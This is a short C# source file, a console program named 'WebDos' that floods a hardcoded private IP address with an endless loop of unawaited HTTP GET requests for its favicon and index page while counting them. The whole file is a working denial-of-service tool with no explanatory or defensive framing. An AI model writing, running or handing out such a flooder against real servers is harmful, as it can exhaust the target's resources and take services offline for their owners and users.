using System;
using System.Collections.Generic;
using System.Net.Http;

namespace WebDos
{
    class Program
    {
        static void Main(string[] args)
        {
            HttpBomb(new(), new[]
            {
                "http://192.168.87.180/favicon.ico",
                "http://192.168.87.180/index.html",
            });
        }
        private static void HttpBomb(HttpClient client, params string[] targets)
        {
            int total = 0;
            while (true)
            {
                client.GetAsync(targets.Random());
                Console.Write($"\r{total++}");
            }
        }
    }
    public static class Extension
    {
        private static readonly Random _random = new();
        public static T Random<T>(this IList<T> list)
        {
            int index = _random.Next(0, list.Count);
            return list[index];
        }
    }
}